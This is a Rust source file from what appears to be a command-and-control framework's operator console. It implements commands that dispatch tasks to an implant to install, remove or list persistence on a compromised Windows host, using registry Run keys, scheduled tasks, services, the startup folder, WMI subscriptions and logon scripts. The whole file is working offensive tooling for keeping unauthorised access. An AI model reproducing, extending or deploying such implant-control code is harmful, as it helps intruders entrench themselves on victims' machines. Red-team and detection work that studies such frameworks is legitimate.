//! Persistence installation and management commands
//!
//! Supported methods: regrun, regrunonce, schtask, service, startup, wmi, logonscript

use anyhow::Result;
use common::ImplantId;
use prost::Message;
use protocol::PersistenceMethod;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Map a method string to the PersistenceMethod enum value
fn method_to_proto(method: &str) -> PersistenceMethod {
    match method {
        "regrun" => PersistenceMethod::PersistRegistryRun,
        "regrunonce" => PersistenceMethod::PersistRegistryRunonce,
        "schtask" => PersistenceMethod::PersistScheduledTask,
        "service" => PersistenceMethod::PersistService,
        "startup" => PersistenceMethod::PersistStartupFolder,
        "wmi" => PersistenceMethod::PersistWmiSubscription,
        "logonscript" => PersistenceMethod::PersistLogonScript,
        _ => PersistenceMethod::PersistUnknown,
    }
}

/// Install a persistence mechanism using the given method, name, payload path, and optional trigger
///
/// Supported methods: regrun, regrunonce, schtask, service, startup, wmi, logonscript
pub async fn install(
    cli: &CliState,
    method: &str,
    name: &str,
    payload_path: &str,
    trigger: Option<&str>,
) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!(
        "Installing persistence via '{}': name='{}' payload='{}'",
        method, name, payload_path
    ));

    let task = protocol::PersistenceTask {
        operation: Some(protocol::persistence_task::Operation::Install(protocol::PersistInstall {
            method: method_to_proto(method) as i32,
            name: name.to_string(),
            payload_path: payload_path.to_string(),
            arguments: None,
            trigger: trigger.map(|t| t.to_string()),
            user_level: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "persist", task_data).await?;
    print_success(&format!("Persistence install task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Remove a previously installed persistence entry by name
pub async fn remove(cli: &CliState, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Removing persistence entry: {}", name));
    let task = protocol::PersistenceTask {
        operation: Some(protocol::persistence_task::Operation::Remove(protocol::PersistRemove {
            method: PersistenceMethod::PersistUnknown as i32,
            name: name.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "persist", task_data).await?;
    print_success(&format!("Persistence remove task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// List all active persistence entries on the implant host
pub async fn list(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Listing persistence entries...");
    let task = protocol::PersistenceTask {
        operation: Some(protocol::persistence_task::Operation::List(protocol::PersistList {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "persist", task_data).await?;
    print_success(&format!("Persistence list task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}
